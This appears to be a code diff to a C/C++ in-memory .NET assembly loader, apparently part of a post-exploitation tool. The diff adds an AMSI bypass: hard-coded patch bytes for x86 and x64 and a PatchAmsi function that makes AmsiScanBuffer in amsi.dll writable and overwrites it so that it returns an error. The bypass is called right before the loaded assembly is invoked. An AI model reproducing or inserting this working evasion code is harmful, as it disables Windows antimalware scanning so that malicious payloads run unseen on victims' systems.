@@ -18,6 +18,15 @@ unsigned char rawData[RAW_ASSEMBLY_LENGTH];
 char sig_40[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
 char sig_20[] = { 0x76,0x32,0x2E,0x30,0x2E,0x35,0x30,0x37,0x32,0x37 };
 
+#ifdef _X32
+char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+SIZE_T patchsize = 6;
+#endif
+#ifdef _X64
+char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+SIZE_T patchsize = 6;
+#endif
+
 int executeSharp(LPVOID lpPayload)
 {
 	
@@ -202,7 +211,8 @@ int executeSharp(LPVOID lpPayload)
 		//if no parameters set cEleemnt to 0
 		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);
 	}
-
+	//Amsi bypass
+	BypassAmsi();
 	//Assembly execution
 	hr = pMethodInfo->Invoke_3(obj, psaStaticMethodArgs, &retVal);
 
@@ -254,6 +264,26 @@ BOOL FindVersion(void * assembly)
 	}
 
 	return FALSE;
+}
+
+BOOL BypassAmsi()
+{
+	PatchAmsi();
+	return TRUE;
+}
+
+VOID PatchAmsi()
+{
+
+	HMODULE lib = LoadLibraryA("amsi.dll");
+	LPVOID addr = GetProcAddress(lib, "AmsiScanBuffer");
+
+	DWORD oldProtect;
+	VirtualProtect(addr, patchsize, 0x40, &oldProtect);
+
+	memcpy(addr, amsipatch, patchsize);
+
+	VirtualProtect(addr, patchsize, oldProtect, &oldProtect);
 }
 
 
